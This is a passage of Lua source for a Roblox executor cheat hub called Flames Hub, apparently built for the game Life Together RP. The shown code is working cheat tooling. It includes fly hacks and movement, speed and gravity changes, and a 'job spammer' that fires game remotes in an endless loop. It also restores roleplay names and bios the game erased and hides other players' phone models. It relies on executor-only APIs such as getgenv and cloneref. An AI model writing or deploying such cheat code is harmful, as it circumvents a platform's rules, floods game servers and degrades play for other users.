      setcaps = true,
      setclipboard = true,
      setclosurecaps = true,
      setconstant = true,
      setfflag = true,
      setfpscap = true,
      sethiddenprop = true,
      sethiddenproperty = true,
      setidentity = true,
      setinternalparent = true,
      setname = true,
      setnamecallmethod = true,
      setproximitypromptduration = true,
      setrawmetatable = true,
      setrbxclipboard = true,
      setreadonly = true,
      setrenderproperty = true,
      setsafeenv = true,
      setscriptable = true,
      setsimulationradius = true,
      setstack = true,
      setstackhidden = true,
      setthreadcontext = true,
      setthreadidentity = true,
      setuntouched = true,
      setupvalue = true,
      setwindowtitle = true,
      toclipboard = true,
      validlevel = true,
      writefile = true,
      playemote = true,
      try_load = true,
      change_gravity_val = true,
      execCmd = true,
      disabled_global_value_correctly = true,
      name_changer_premium = true,
      Flames_Debugger_Function_Tester_GUI = true,
      notify = true,
      start_scan = true,
      SetFPSCap = true
   }

   getgenv().Flames_Debugger_Function_Tester_GUI = function()
      local genv = getgenv()
      local Players = game:GetService("Players")
      local CoreGui = genv.CoreGui or (cloneref and cloneref(game:GetService("CoreGui"))) or game:GetService("CoreGui")
      local UIS = genv.UserInputService or game:GetService("UserInputService")
      local start_scan

      if genv.__flames_debugger_running then
         if getgenv().notify then
            return getgenv().notify("Warning", "Flames Debugger is already running!", 5)
         else
            return warn("Flames Debugger is already running.")
         end
      end

      if CoreGui:FindFirstChild("FlamesDebugger") then
         CoreGui.FlamesDebugger.Enabled = true
         genv.__flames_debugger_running = false
         getgenv().dont_receive_any_notifications_flames_hub = false
         return
      end

      local gui = Instance.new("ScreenGui")
      gui.Name = "FlamesDebugger"
      gui.ResetOnSpawn = false
      gui.Parent = CoreGui

      local frame = Instance.new("Frame")
      frame.Size = UDim2.fromOffset(400,300)
      frame.Position = UDim2.fromScale(0.4,0.3)
      frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
      frame.Parent = gui

      Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)

      local title = Instance.new("TextLabel")
      title.Size = UDim2.new(1,-150,0,30)
      title.Position = UDim2.new(0,10,0,5)
      title.BackgroundTransparency = 1
      title.Text = "Flames Hub | Debugger"
      title.TextScaled = true
      title.TextColor3 = Color3.new(1,1,1)
      title.Parent = frame

      local close = Instance.new("TextButton")
      close.Size = UDim2.fromOffset(26,26)
      close.Position = UDim2.new(1,-32,0,4)
      close.Text = "X"
      close.TextScaled = true
      close.BackgroundColor3 = Color3.fromRGB(120,40,40)
      close.TextColor3 = Color3.new(1,1,1)
      close.Parent = frame

      Instance.new("UICorner", close).CornerRadius = UDim.new(1,0)

      close.MouseButton1Click:Connect(function()
         gui.Enabled = false
      end)

      local rescan = Instance.new("TextButton")
      rescan.Size = UDim2.fromOffset(90,24)
      rescan.Position = UDim2.new(1,-130,0,6)
      rescan.Text = "Start Scan"
      rescan.TextScaled = true
      rescan.BackgroundColor3 = Color3.fromRGB(40,90,140)
      rescan.TextColor3 = Color3.new(1,1,1)
      rescan.Parent = frame

      rescan.MouseButton1Click:Connect(function()
         if not genv.__flames_debugger_running then
            genv.__flames_debugger_running = true
            getgenv().dont_receive_any_notifications_flames_hub = true
            start_scan()
         end
      end)

      Instance.new("UICorner", rescan).CornerRadius = UDim.new(0,6)

      local list = Instance.new("ScrollingFrame")
      list.Position = UDim2.new(0,10,0,40)
      list.Size = UDim2.new(1,-20,1,-50)
      list.CanvasSize = UDim2.new(0,0,0,0)
      list.ScrollBarImageTransparency = 0.2
      list.Parent = frame

      local layout = Instance.new("UIListLayout")
      layout.Padding = UDim.new(0,4)
      layout.Parent = list

      local function update_canvas()
         list.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y + 6)
      end

      layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(update_canvas)

      local function add_row(text, success)
         local row = Instance.new("TextLabel")
         row.Size = UDim2.new(1,-6,0,24)
         row.TextXAlignment = Enum.TextXAlignment.Left
         row.TextScaled = true
         row.TextColor3 = Color3.new(1,1,1)
         row.BackgroundColor3 = success and Color3.fromRGB(30,80,30) or Color3.fromRGB(90,30,30)
         row.Text = (success and "  ✅  " or "  ❌  ") .. text
         row.Parent = list
      end

      local function snapshot_guis()
         local snap = {}
         for _,v in ipairs(CoreGui:GetChildren()) do
            if v:IsA("ScreenGui") then
               snap[v] = true
            end
         end
         return snap
      end

      local function cleanup_guis(before)
         for _,v in ipairs(CoreGui:GetChildren()) do
            if v:IsA("ScreenGui") and not before[v] and v ~= gui then
               pcall(function()
                  v:Destroy()
               end)
            end
         end
      end

      local function clear_list()
         for _,v in ipairs(list:GetChildren()) do
            if v:IsA("TextLabel") then
               v:Destroy()
            end
         end
      end

      if rescan and rescan:IsA("TextButton") then
         task.spawn(function()
            while true do
               wait(0.5)
               if getgenv().button_text_changing_for_debug_scanner then
                  wait(0.5)
                  rescan.Text = "Scan Running."
                  wait(0.6)
                  if not getgenv().button_text_changing_for_debug_scanner then end

                  rescan.Text = "Scan Running.."
                  wait(0.6)
                  if not getgenv().button_text_changing_for_debug_scanner then end

                  rescan.Text = "Scan Running..."
                  wait(0.6)
               else
                  wait(0.6)
               end
            end
         end)
      end

      start_scan = function()
         task.spawn(function()
            getgenv().button_text_changing_for_debug_scanner = true

            local function run_scan()
               clear_list()

               local tested = 0

               for name,value in next,genv do
                  if tested >= 25 then break end

                  if typeof(value) == "function" and not excluded_functions[name] then
                     tested = tested + 1

                     local before = snapshot_guis()
                     local ok, err = pcall(value)
                     cleanup_guis(before)

                     if ok then
                        add_row(name.."()", true)
                     else
                        if typeof(err) == "string" then
                           local lower = err:lower()
                           if lower:find("nil") or lower:find("argument") or lower:find("index") then
                              add_row(name.."() - ignore", false)
                           else
                              add_row(name.."() - runtime error", false)
                           end
                        else
                           add_row(name.."()", false)
                        end
                     end

                     wait(0.5)
                  end
               end

               if tested == 0 then
                  add_row("No functions found to test", false)
                  getgenv().dont_receive_any_notifications_flames_hub = false
               else
                  add_row("Completed testing "..tested.." functions", true)
                  getgenv().dont_receive_any_notifications_flames_hub = false
               end
            end

            pcall(run_scan)

            getgenv().button_text_changing_for_debug_scanner = false
            genv.__flames_debugger_running = false
            getgenv().dont_receive_any_notifications_flames_hub = false

            if rescan and rescan:IsA("TextButton") then
               rescan.Text = "Start Scan"
            end
         end)
      end

      local dragging = false
      local drag_start
      local start_pos
      local drag_input

      title.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            drag_start = input.Position
            start_pos = frame.Position
            input.Changed:Connect(function()
               if input.UserInputState == Enum.UserInputState.End then
                  dragging = false
               end
            end)
         end
      end)

      title.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement then
            drag_input = input
         end
      end)

      UIS.InputChanged:Connect(function(input)
         if input == drag_input and dragging then
            local delta = input.Position - drag_start
            frame.Position = UDim2.new(
               start_pos.X.Scale,
               start_pos.X.Offset + delta.X,
               start_pos.Y.Scale,
               start_pos.Y.Offset + delta.Y
            )
         end
      end)
   end

   getgenv().CreateCreditsLabel = function()
      if getgenv().CreditsLabelGui then
         getgenv().CreditsLabelGui:Destroy()
      end

      local creditsGui = Instance.new("ScreenGui")
      creditsGui.Name = "PrefixCreditsGui_LifeTogether"
      creditsGui.ResetOnSpawn = false
      creditsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
      creditsGui.Parent = CoreGui

      local label = Instance.new("TextLabel")
      label.Name = "CreditsLabel"
      getgenv().MainCreditsLabel_WithPrefix = label
      label.AnchorPoint = Vector2.new(0.5, 1)

      if isMobile then
         label.Position = UDim2.new(0.5, 0, 0.95, -10)
         label.Size = UDim2.new(0.3, 0, 0, 28)
      else
         label.Position = UDim2.new(0.5, 0, 0.949999988, 25)
         label.Size = UDim2.new(0.6, 0, 0, 28)
      end

      label.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
      label.TextColor3 = Color3.fromRGB(0, 0, 0)
      flowrgb("PrefixCreditsLabelConn", 1, label, true)

      local prefix = decodeHTMLEntities(tostring(getgenv().AdminPrefix))
      local parts = {
         tostring(getgenv().Script_Version)
      }

      if holiday ~= "" then
         table.insert(parts, holiday)
      end

      table.insert(parts, "Made By: " .. tostring(Script_Creator))
      table.insert(parts, "Current Prefix: " .. prefix)

      if masked_flames_hub_server_ID then
         table.insert(parts, "Your Flames-Hub UUID: " .. tostring(masked_flames_hub_server_ID))
      end

      label.Text = table.concat(parts, " | ")
      label.Font = Enum.Font.GothamBold
      label.TextScaled = true
      label.RichText = false
      label.TextStrokeTransparency = 1
      label.BackgroundTransparency = 0
      label.ZIndex = 10
      label.Parent = creditsGui

      local corner = Instance.new("UICorner")
      corner.CornerRadius = UDim.new(0, 10)
      corner.Parent = label

      getgenv().CreditsLabelGui = creditsGui
      getgenv().CreditsLabelText = label

      if getgenv()._PrefixUpdateConnection then
         getgenv()._PrefixUpdateConnection:Disconnect()
      end

      if typeof(getgenv().AdminPrefix) == "Instance" and getgenv().AdminPrefix:IsA("StringValue") then
         getgenv()._PrefixUpdateConnection = getgenv().AdminPrefix.Changed:Connect(function()
            local prefix = decodeHTMLEntities(tostring(getgenv().AdminPrefix))

            local parts = {
               tostring(getgenv().Script_Version)
            }

            if holiday ~= "" then
               table.insert(parts, holiday)
            end

            table.insert(parts, "Made By: " .. tostring(Script_Creator))
            table.insert(parts, "Current Prefix: " .. prefix)

            if masked_flames_hub_server_ID then
               table.insert(parts, "Your Flames-Hub UUID: " .. tostring(masked_flames_hub_server_ID))
            end

            label.Text = table.concat(parts, " | ")
         end)
      else
         getgenv().LastPrefix_Updater_Main_Task_Watcher = getgenv().LastPrefix_Updater_Main_Task_Watcher or task.spawn(function()
            local lastPrefix = tostring(getgenv().AdminPrefix)

            while label and label.Parent do
               task.wait(0.3)

               if tostring(getgenv().AdminPrefix) ~= lastPrefix then
                  lastPrefix = tostring(getgenv().AdminPrefix)
                  local prefix = decodeHTMLEntities(tostring(getgenv().AdminPrefix))

                  local parts = {
                     tostring(getgenv().Script_Version)
                  }

                  if holiday ~= "" then
                     table.insert(parts, holiday)
                  end

                  table.insert(parts, "Made By: " .. tostring(Script_Creator))
                  table.insert(parts, "Current Prefix: " .. prefix)

                  if masked_flames_hub_server_ID then
                     table.insert(parts, "Your Flames-Hub UUID: " .. tostring(masked_flames_hub_server_ID))
                  end

                  label.Text = table.concat(parts, " | ")
               end
            end
         end)
      end
   end

   CreateCreditsLabel()
   g.PhoneHandle_Connections = g.PhoneHandle_Connections or {}
   g.hidden_pcm = g.hidden_pcm or {}         -- [pcm] = {connection, original values}
   g.HidePhoneModels = g.HidePhoneModels or false

   g.hide_pcm = function(pcm)
      if not pcm or not pcm:IsA("Model") then return end
      if g.hidden_pcm[pcm] then return end

      local descConn = pcm.DescendantAdded:Connect(function(v)
         if not g.HidePhoneModels then return end
         if v:IsA("BasePart") then
            v.LocalTransparencyModifier = 1
            v.CanCollide = false
            v.CanQuery = false
            v.CanTouch = false
         elseif v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 1
         elseif v:IsA("Sound") then
            v.Volume = 0
         end
      end)

      g.hidden_pcm[pcm] = { conn = descConn }

      for _, v in ipairs(pcm:GetDescendants()) do
         if v:IsA("BasePart") then
            v.LocalTransparencyModifier = 1
            v.CanCollide = false
            v.CanQuery = false
            v.CanTouch = false
         elseif v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 1
         elseif v:IsA("Sound") then
            v.Volume = 0
         end
      end
   end

   g.show_pcm = function(pcm)
      if not pcm or not pcm:IsA("Model") then return end
      local entry = g.hidden_pcm[pcm]
      if not entry then return end

      if entry.conn and entry.conn.Connected then
         entry.conn:Disconnect()
      end
      g.hidden_pcm[pcm] = nil

      for _, v in ipairs(pcm:GetDescendants()) do
         if v:IsA("BasePart") then
            v.LocalTransparencyModifier = 0
            v.CanCollide = true
            v.CanQuery = true
            v.CanTouch = true
         elseif v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 0
         elseif v:IsA("Sound") then
            v.Volume = 0.5
         end
      end
   end

   g.try_hide_pcm = function(character)
      if not g.HidePhoneModels then return end
      if not character then return end

      local plr = Players:GetPlayerFromCharacter(character)
      if not plr or plr == LocalPlayer then return end

      local pcm = character:FindFirstChild("PhoneCharacterModel")
      if not pcm then return end

      g.hide_pcm(pcm)
   end

   g.scan_character = function(character)
      if not character then return end

      task.defer(function()
         g.try_hide_pcm(character)
      end)

      local c = character.ChildAdded:Connect(function(child)
         if child:IsA("Model") and child.Name == "PhoneCharacterModel" then
            task.defer(function()
               if g.HidePhoneModels then
                  g.hide_pcm(child)
               end
            end)
         end
      end)

      table.insert(g.PhoneHandle_Connections, c)
   end

   g.hook_player = function(plr)
      if plr == LocalPlayer then return end

      task.spawn(function()
         local start = os.clock()
         while not plr.Character and os.clock() - start < 18 do
            task.wait(0.25)
         end
         if plr.Character then
            g.scan_character(plr.Character)
         end
      end)

      local c = plr.CharacterAdded:Connect(function(char)
         g.scan_character(char)
      end)

      table.insert(g.PhoneHandle_Connections, c)
   end

   for _, plr in ipairs(Players:GetPlayers()) do
      g.hook_player(plr)
   end

   local cAdd = Players.PlayerAdded:Connect(g.hook_player)
   table.insert(g.PhoneHandle_Connections, cAdd)

   g.rescan_all_pcms = function()
      for _, pcm in ipairs(workspace:GetDescendants()) do
         if pcm:IsA("Model") and pcm.Name == "PhoneCharacterModel" then
            local char = pcm.Parent
            if char and char:FindFirstChildOfClass("Humanoid") then
               if g.HidePhoneModels then
                  g.hide_pcm(pcm)
               else
                  g.show_pcm(pcm)
               end
            end
         end
      end
   end

   g.TogglePhoneModelHider = function(state)
      if type(state) == "boolean" then
         g.HidePhoneModels = state
      else
         g.HidePhoneModels = not g.HidePhoneModels
      end

      if g.HidePhoneModels then
         for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
               local character = plr.Character
               task.delay(0.6, function()
                  if character and character.Parent then
                     g.try_hide_pcm(character)
                  end
               end)
            end
         end
         g.rescan_all_pcms()
      else
         for pcm in pairs(g.hidden_pcm) do
            g.show_pcm(pcm)
         end
      end
   end

   g.ShutdownPhoneModelHider = function()
      for pcm in pairs(g.hidden_pcm) do
         g.show_pcm(pcm)
      end

      for _, c in ipairs(g.PhoneHandle_Connections) do
         if typeof(c) == "RBXScriptConnection" and c.Connected then
            c:Disconnect()
         end
      end
      table.clear(g.PhoneHandle_Connections)
      table.clear(g.hidden_pcm)
   end

   getgenv().change_RP_Name = function(New_Name)
      send_remote("roleplay_name", tostring(New_Name))
   end

   getgenv().change_bio = function(New_Bio)
      send_remote("bio", tostring(New_Bio))
   end
   fw(0.2)
   -- [[ ultra safe checking that always works + falls back to your current roleplay name if not already saved so you don't have to do it yourself. ]] --
   if isfile and readfile then
      if isfile and isfile("LifeTogether_RP_Admin_Custom_Name.txt") then
         notify("Success", "Got your last RP name (it was erased by Life Together RP), but we're setting it back!", 15)
         local saved_name = readfile and readfile("LifeTogether_RP_Admin_Custom_Name.txt")
         if saved_name and #saved_name > 0 then
            change_RP_Name(saved_name)
         else
            writefile("LifeTogether_RP_Admin_Custom_Name.txt", tostring(getgenv().LocalPlayer:GetAttribute("roleplay_name")) or "DEFAULT")
         end
      end

      if isfile and isfile("LifeTogether_RP_Admin_Custom_Bio.txt") then
         notify("Success", "Got your last RP bio (it was erased by Life Together RP), but we're setting it back!", 15)
         local saved_bio = readfile and readfile("LifeTogether_RP_Admin_Custom_Bio.txt")
         if saved_bio and #saved_bio > 0 then
            change_bio(saved_bio)
         else
            writefile("LifeTogether_RP_Admin_Custom_Bio.txt", tostring(getgenv().LocalPlayer:GetAttribute("roleplay_name")) or "DEFAULT")
         end
      end
   end

   getgenv().job_spammer = function(toggle)
      local lib = getgenv().FlamesLibrary
      local key = "job_spammer_loop"
      local fw = lib.wait

      if toggle == true then
         if getgenv().Every_Job then
            return notify("Warning", "Job spammer is already enabled! disable it first.", 5)
         end

         getgenv().Every_Job = true
         notify("Success", "Job Spammer has been enabled.", 5)

         lib.spawn(key, "spawn", function()
            while getgenv().Every_Job == true do
            fw(0)
               getgenv().Send("job", "Police")
               fw(0)
               getgenv().Send("job", "Firefighter")
               fw(0)
               getgenv().Send("job", "Baker")
               fw(0)
               getgenv().Send("job", "Pizza Worker")
               fw(0)
               getgenv().Send("job", "Barista")
               fw(0)
               getgenv().Send("job", "Doctor")
               fw(0)
            end
            lib.disconnect(key)
         end)
      elseif toggle == false then
         if not getgenv().Every_Job then
            return notify("Warning", "Job spammer is not enabled! enable it first.", 5)
         end

         getgenv().Every_Job = false
         lib.disconnect(key)
         notify("Success", "Job Spammer has been disabled.", 5)
      end
   end

   getgenv().stored_effects_main_tbl = getgenv().stored_effects_main_tbl or {}
   getgenv().stored_parts_main_tbl = getgenv().stored_parts_main_tbl or {}
   getgenv().parts_seen = getgenv().parts_seen or {}

   local lighting = getgenv().Lighting or cloneref and cloneref(game:GetService("Lighting")) or game:GetService("Lighting")
   local work = cloneref and cloneref(workspace) or game:GetService("Workspace")

   getgenv().validWorkspacePart = function(inst)
      if not inst or not inst.Parent then return false end
      if inst:IsDescendantOf(lighting) then return false end
      if inst:IsDescendantOf(LocalPlayer.Character or Instance.new("Folder")) then return false end
      return true
   end

   getgenv().saveAndModify = function(inst)
      if getgenv().parts_seen[inst] then return end
      getgenv().parts_seen[inst] = true

      if inst:IsA("BasePart") then
         table.insert(getgenv().stored_parts_main_tbl, {inst = inst, prop = "cast", val = inst.CastShadow})
         inst.CastShadow = false
      elseif inst:IsA("Decal") then
         table.insert(getgenv().stored_parts_main_tbl, {inst = inst, prop = "decal", tex = inst.Texture, transp = inst.Transparency})
         inst.Transparency = 1
         inst.Texture = ""
      elseif inst:IsA("ParticleEmitter") then
         table.insert(getgenv().stored_parts_main_tbl, {inst = inst, prop = "particle", enabled = inst.Enabled, rate = inst.Rate})
         inst.Enabled = false
         inst.Rate = 0
      elseif inst:IsA("Trail") then
         table.insert(getgenv().stored_parts_main_tbl, {inst = inst, prop = "trail", enabled = inst.Enabled})
         inst.Enabled = false
      end
   end

   getgenv().posteffparts = function(toggle)
      local genv = getgenv()

      if toggle then
         if genv.post_effects_off_main then return end
         genv.post_effects_off_main = true

         table.clear(genv.stored_effects_main_tbl)
         table.clear(genv.stored_parts_main_tbl)
         table.clear(genv.parts_seen)

         for _, v in ipairs(lighting:GetDescendants()) do
            if v:IsA("PostEffect") then
               table.insert(genv.stored_effects_main_tbl, {inst = v, enabled = v.Enabled})
               v.Enabled = false
            end
         end

         for _, v in ipairs(work:GetDescendants()) do
            if validWorkspacePart(v) then
               saveAndModify(v)
            end
         end

         genv._saved_fog_start = lighting.FogStart
         genv._saved_fog_end = lighting.FogEnd
         lighting.FogStart = 1e5
         lighting.FogEnd = 1e5

         if genv.parts_disabler_conn then
            genv.parts_disabler_conn:Disconnect()
         end

         genv.parts_disabler_conn = work.DescendantAdded:Connect(function(child)
            if not genv.post_effects_off_main then return end
            if not validWorkspacePart(child) then return end
            task.defer(function()
               if child.Parent then
                  saveAndModify(child)
               end
            end)
         end)
      else
         if not genv.post_effects_off_main then return end
         genv.post_effects_off_main = false

         for _, v in ipairs(genv.stored_effects_main_tbl) do
            if v.inst and v.inst.Parent then
               v.inst.Enabled = v.enabled
            end
         end

         for _, data in ipairs(genv.stored_parts_main_tbl) do
            if data.inst and data.inst.Parent then
               if data.prop == "cast" then
                  data.inst.CastShadow = data.val
               elseif data.prop == "decal" then
                  data.inst.Transparency = data.transp
                  data.inst.Texture = data.tex
               elseif data.prop == "particle" then
                  data.inst.Enabled = data.enabled
                  data.inst.Rate = data.rate
               elseif data.prop == "trail" then
                  data.inst.Enabled = data.enabled
               end
            end
         end

         if genv.parts_disabler_conn then
            genv.parts_disabler_conn:Disconnect()
            genv.parts_disabler_conn = nil
         end

         if genv._saved_fog_start then lighting.FogStart = genv._saved_fog_start end
         if genv._saved_fog_end then lighting.FogEnd = genv._saved_fog_end end

         table.clear(genv.stored_effects_main_tbl)
         table.clear(genv.stored_parts_main_tbl)
         table.clear(genv.parts_seen)
      end
   end

   getgenv().TogglePostEffectsParts = posteffparts

   if not getgenv().FlamesLagReducerFunc then
      getgenv().FlamesLagReducerFunc = function(toggle)
         if toggle then
            if getgenv().ultimate_lag_reducer then return notify("Warning", "Flames Hub | Lag Reducer : is already enabled.", 10) end
            getgenv().ultimate_lag_reducer = true
            notify("Success", "Flames Hub | Lag Reducer : is now enabled.", 5)
            pcall(function() getgenv().Send("hide_other_names", true) end)
            pcall(function() getgenv().Send("hide_map_icon", true) end)
            if togglergbflows and typeof(togglergbflows) == "function" then pcall(togglergbflows, false) end
            posteffparts(true)
         else
            if not getgenv().ultimate_lag_reducer then return notify("Warning", "Flames Hub | Lag Reducer : is not enabled.", 10) end
            getgenv().ultimate_lag_reducer = false
            notify("Success", "Flames Hub | Lag Reducer : is now disabled.", 5)
            pcall(function() getgenv().Send("hide_other_names", false) end)
            pcall(function() getgenv().Send("hide_map_icon", false) end)
            posteffparts(false)
         end
      end
   end

   getgenv().DefaultSpeed = getgenv().StarterPlayer.CharacterWalkSpeed
   getgenv().DefaultJP = getgenv().StarterPlayer.CharacterJumpHeight
   getgenv().Old_Workspace_Gravity = getgenv().Workspace.Gravity

   getgenv().change_property = function(property, new_property_value)
      local properties_allowed_to_be_changed = {
         WalkSpeed = true,
         JumpHeight = true,
         HipHeight = true
      }

      if properties_allowed_to_be_changed[property] and getgenv().Humanoid then
         getgenv().Humanoid[property] = new_property_value
      end
   end

   getgenv().change_gravity_val = function(new_val)
      if new_val > 300 then
         new_val = 196
      end

      getgenv().Workspace.Gravity = tonumber(new_val) or 196
   end

   getgenv().reset_properties = function()
      if not getgenv().Humanoid then return end

      getgenv().Humanoid.WalkSpeed = DefaultSpeed or 16
      getgenv().Humanoid.JumpHeight = DefaultJP or 7
      getgenv().Workspace.Gravity = Old_Workspace_Gravity or 196
   end

   getgenv().rainbow_car = function()
      RGB_Vehicle(true)
   end

   getgenv().stop_rainbow_car = function()
      RGB_Vehicle(false)
   end

   getgenv().rainbow_others_car = function(Player)
      RGB_Vehicle_Others(Player, true)
   end

   getgenv().stop_rainbow_others_car = function(Player)
      RGB_Vehicle_Others(Player, false)
   end

   local character = getgenv().Character or getgenv().LocalPlayer.Character or get_char(LocalPlayer or game.Players.LocalPlayer)
   local humanoid = getgenv().Humanoid or getgenv().Character:FindFirstChildOfClass("Humanoid") or get_human(LocalPlayer or game.Players.LocalPlayer)
   local camera = Workspace.CurrentCamera or getgenv().Workspace.CurrentCamera or workspace.CurrentCamera
   getgenv().AdonisAdminFlyEnabled = getgenv().AdonisAdminFlyEnabled or false
   getgenv().AdonisAdminFlySpeed = getgenv().AdonisAdminFlySpeed or 15
   getgenv().FlyConnections = getgenv().FlyConnections or {}
   getgenv().FlyPart = getgenv().FlyPart or nil

   getgenv().SetAdonisFlySpeed = function(v)
      v = tonumber(v)
      if not v then return end
      getgenv().AdonisAdminFlySpeed = math.clamp(v, 1, 300)
   end

   getgenv().StartAdonisAdminFlyScript = function()
      if getgenv().AdonisAdminFlyEnabled then return end
      getgenv().AdonisAdminFlyEnabled = true

      local dir = {w = false, a = false, s = false, d = false, q = false, e = false}
      local cf = Instance.new("CFrameValue")

      if not getgenv().FlyPart then
         getgenv().FlyPart = Instance.new("Part")
         getgenv().FlyPart.Name = "PART_SURFER"
         getgenv().FlyPart.Anchored = true
         getgenv().FlyPart.Parent = StarterPack
         getgenv().FlyPart.CFrame = HumanoidRootPart and HumanoidRootPart.CFrame or CFrame.new()
      end

      getgenv().FlyConnections.render = RunService.RenderStepped:Connect(function()
         if not getgenv().AdonisAdminFlyEnabled or not HumanoidRootPart then return end

         local speed = tonumber(getgenv().AdonisAdminFlySpeed) or 15
         speed = math.clamp(speed, 1, 300)

         for _, v in pairs(character:GetDescendants()) do
            if v:IsA("BasePart") then
               v.Velocity = Vector3.zero
               v.RotVelocity = Vector3.zero
            end
         end

         getgenv().FlyPart.CFrame = CFrame.new(
            getgenv().FlyPart.CFrame.Position,
            (camera.CFrame * CFrame.new(0, 0, -100)).Position
         )

         local offset = Vector3.zero

         if isMobile and controlModule then
            local mv = controlModule:GetMoveVector()
            if mv.Magnitude > 0 then
               offset =
                  (camera.CFrame.LookVector * -mv.Z +
                  camera.CFrame.RightVector * mv.X) * speed
            end
         else
            local x, y, z = 0, 0, 0
            if dir.w then z = -speed end
            if dir.s then z = speed end
            if dir.a then x = -speed end
            if dir.d then x = speed end
            if dir.q then y = speed end
            if dir.e then y = -speed end
            offset = Vector3.new(x, y, z)
         end

         local moveCF = CFrame.new(offset)
         cf.Value = cf.Value:Lerp(moveCF, 0.2)

         getgenv().FlyPart.CFrame =
            getgenv().FlyPart.CFrame:Lerp(getgenv().FlyPart.CFrame * cf.Value, 0.2)

         HumanoidRootPart.CFrame = getgenv().FlyPart.CFrame
         humanoid.PlatformStand = true
      end)

      getgenv().FlyConnections.inputBegan = UserInputService.InputBegan:Connect(function(input, event)
         if event or not getgenv().AdonisAdminFlyEnabled then return end
         local code, codes = input.KeyCode, Enum.KeyCode
         if code == codes.W then
            dir.w = true
         elseif code == codes.A then dir.a = true
         elseif code == codes.S then dir.s = true
         elseif code == codes.D then dir.d = true
         elseif code == codes.Q then dir.q = true
         elseif code == codes.E then dir.e = true
         elseif code == codes.Space then
            dir.q = true
         end
      end)

      getgenv().FlyConnections.inputEnded = UserInputService.InputEnded:Connect(function(input, event)
         if event or not getgenv().AdonisAdminFlyEnabled then return end
         local code, codes = input.KeyCode, Enum.KeyCode
         if code == codes.W then
            dir.w = false
         elseif code == codes.A then dir.a = false
         elseif code == codes.S then dir.s = false
         elseif code == codes.D then dir.d = false
         elseif code == codes.Q then dir.q = false
         elseif code == codes.E then dir.e = false
         elseif code == codes.Space then
            dir.q = false
         end
      end)
      fw(0.1)
      getgenv().notify("Success", "Fly-3 has been enabled with speed: "..tostring(getgenv().AdonisAdminFlySpeed), 6)
   end

   getgenv().Stop_Fly_3_Function = function()
      if not getgenv().AdonisAdminFlyEnabled then return notify("Warning", "Fly-3 is not enabled.", 5) end
      getgenv().AdonisAdminFlyEnabled = false

      for _, conn in pairs(getgenv().FlyConnections) do
         if conn then conn:Disconnect() end
      end
      if next(getgenv().FlyConnections) then
         getgenv().FlyConnections = {}
      end

      if getgenv().FlyPart then
         getgenv().FlyPart:Destroy()
         getgenv().FlyPart = nil
      end

      if humanoid then
         humanoid.PlatformStand = false
      end
   end

   getgenv().Enabled_Flying = getgenv().Enabled_Flying or false
   getgenv().Fly2Speed = getgenv().Fly2Speed or 45
   getgenv().Fly2Control = nil
   getgenv().fly2InputBegan = nil
   getgenv().fly2InputEnded = nil
   getgenv().fly2Heartbeat = nil
   getgenv().fly2MobileConn = nil

   getgenv().EnableFly2 = function(speed)
      if getgenv().Enabled_Flying then
         return notify("Warning", "Fly-2 already enabled!", 5)
      end

      local UIS = getgenv().UserInputService
      local plr = getgenv().LocalPlayer or game.Players.LocalPlayer
      local char = getgenv().Character or get_char(plr)
      local HRP = getgenv().HumanoidRootPart or get_root(plr)
      local Humanoid = getgenv().Humanoid or get_human(plr)
      local Workspace = getgenv().Workspace or safe_wrapper("Workspace")
      local RunService = getgenv().RunService or safe_wrapper("RunService")
      local Debris = getgenv().Debris or safe_wrapper("Debris")

      if not HRP or not Humanoid then
         return notify("Error", "Character is not ready or Humanoid is missing.", 5)
      end

      getgenv().Enabled_Flying = true
      getgenv().Fly2Speed = tonumber(speed) or getgenv().Fly2Speed
      getgenv().Fly2Control = {F=0,B=0,L=0,R=0}
      local flyY, lastPos = 0, nil

      local gyro = Instance.new("BodyGyro")
      gyro.P = 9e4
      gyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
      gyro.CFrame = HRP.CFrame
      gyro.Name = "Fly2Gyro"
      gyro.Parent = HRP

      local vel = Instance.new("BodyVelocity")
      vel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
      vel.Velocity = Vector3.zero
      vel.Name = "Fly2Velocity"
      vel.Parent = HRP

      Humanoid.PlatformStand = true

      if not isMobile then
         if getgenv().fly2InputBegan then getgenv().fly2InputBegan:Disconnect() end
         if getgenv().fly2InputEnded then getgenv().fly2InputEnded:Disconnect() end
         if getgenv().fly2Heartbeat then getgenv().fly2Heartbeat:Disconnect() end

         getgenv().fly2InputBegan = UIS.InputBegan:Connect(function(input, gp)
            if gp then return end
            local s = getgenv().Fly2Speed
            if input.KeyCode == Enum.KeyCode.W then getgenv().Fly2Control.F = s end
            if input.KeyCode == Enum.KeyCode.S then getgenv().Fly2Control.B = -s end
            if input.KeyCode == Enum.KeyCode.A then getgenv().Fly2Control.L = -s end
            if input.KeyCode == Enum.KeyCode.D then getgenv().Fly2Control.R = s end
            if input.KeyCode == Enum.KeyCode.Space then flyY = s end
            if input.KeyCode == Enum.KeyCode.LeftShift then flyY = -s end
         end)

         getgenv().fly2InputEnded = UIS.InputEnded:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.W then getgenv().Fly2Control.F = 0 end
            if input.KeyCode == Enum.KeyCode.S then getgenv().Fly2Control.B = 0 end
            if input.KeyCode == Enum.KeyCode.A then getgenv().Fly2Control.L = 0 end
            if input.KeyCode == Enum.KeyCode.D then getgenv().Fly2Control.R = 0 end
            if input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.LeftShift then flyY = 0 end
         end)

         getgenv().fly2Heartbeat = RunService.RenderStepped:Connect(function()
            if not getgenv().Enabled_Flying then return end
            local C, cam, SPEED = getgenv().Fly2Control, Workspace.CurrentCamera, getgenv().Fly2Speed * 50

            if C.F~=0 or C.B~=0 or C.L~=0 or C.R~=0 or flyY~=0 then
